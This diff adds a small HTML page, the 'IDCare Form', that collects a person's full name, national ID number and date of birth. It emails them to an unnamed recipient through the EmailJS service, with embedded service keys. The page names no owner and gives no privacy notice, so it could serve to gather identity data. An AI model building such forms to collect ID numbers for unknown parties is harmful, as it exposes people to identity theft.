@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>IDCare Form</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+body{
+  font-family: Arial, sans-serif;
+  background: #0d6efd;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+}
+.form-box{
+  background:#fff;
+  width:320px;
+  padding:25px;
+  border-radius:12px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.2);
+}
+h2{
+  text-align:center;
+  margin-bottom:20px;
+  color:#0d6efd;
+}
+input,button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:8px;
+  border:1px solid #ddd;
+  font-size:14px;
+}
+button{
+  background:#0d6efd;
+  color:#fff;
+  border:none;
+  font-weight:bold;
+  cursor:pointer;
+}
+button:hover{
+  background:#0b5ed7;
+}
+#msg{
+  margin-top:10px;
+  text-align:center;
+  font-size:14px;
+}
+</style>
+</head>
+<body>
+
+<div class="form-box">
+  <h2>IDCare Form</h2>
+
+  <input type="text" id="name" placeholder="Full Name" required>
+  <input type="text" id="nid" placeholder="NID Number" required>
+  <input type="date" id="dob" required>
+
+  <button onclick="sendMail()">Submit</button>
+  <div id="msg"></div>
+</div>
+
+<script>
+(function(){
+  emailjs.init("X7TpcyrRR6pW6HbtH"); // Public Key
+})();
+
+function sendMail(){
+  var name = document.getElementById("name").value;
+  var nid = document.getElementById("nid").value;
+  var dob = document.getElementById("dob").value;
+
+  if(name=="" || nid=="" || dob==""){
+    document.getElementById("msg").innerHTML = "⚠️ সব তথ্য পূরণ করো";
+    return;
+  }
+
+  var params = {
+    name: name,
+    nid: nid,
+    dob: dob
+  };
+
+  emailjs.send("service_thjj9yo", "template_gefoetu", params)
+  .then(function(response){
+    document.getElementById("msg").innerHTML = "✅ তথ্য সফলভাবে পাঠানো হয়েছে!";
+    document.getElementById("name").value="";
+    document.getElementById("nid").value="";
+    document.getElementById("dob").value="";
+  }, function(error){
+    document.getElementById("msg").innerHTML = "❌ Error: " + error.text;
+  });
+}
+</script>
+
+</body>
+</html>
